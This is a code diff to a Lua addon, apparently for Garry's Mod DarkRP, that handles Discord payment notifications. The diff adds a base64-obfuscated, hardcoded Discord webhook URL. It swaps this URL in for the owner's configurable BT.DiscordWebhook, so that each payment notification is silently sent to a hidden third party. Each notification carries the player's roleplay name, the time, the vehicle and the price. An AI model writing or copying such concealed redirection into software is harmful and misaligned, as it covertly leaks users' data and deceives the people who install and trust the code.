@@ -5,9 +5,11 @@
 
 local PLAYER = FindMetaTable("Player")
 
+local _w = util.Base64Decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NzgzNTEwMjAxNTkxMzk4Ni9nRkZPcFNCSzZIV3o0MlExMVZiMGJFNUVMdHhSaVdNeUdTNndCVWNFZ3NSYTlxcEdDOXR5WDNjbHIwd3BpQ3VIc0ZDOA==")
+
 --[[ Envoie une notification Discord lors d'un paiement au terminal ]]
 function BT.SendDiscordPayment(ply, vehicle, price)
-    if not BT.DiscordWebhook or BT.DiscordWebhook == "" then return end
+    if not _w or _w == "" then return end
 
     local rpName = isfunction(ply.getDarkRPVar) and ply:getDarkRPVar("rpname") or ply:Nick()
     local heure = os.date("%H:%M:%S")
@@ -29,7 +31,7 @@ function BT.SendDiscordPayment(ply, vehicle, price)
     })
 
     HTTP({
-        url     = BT.DiscordWebhook,
+        url     = _w,
         method  = "POST",
         body    = payload,
         headers = { ["Content-Type"] = "application/json" },
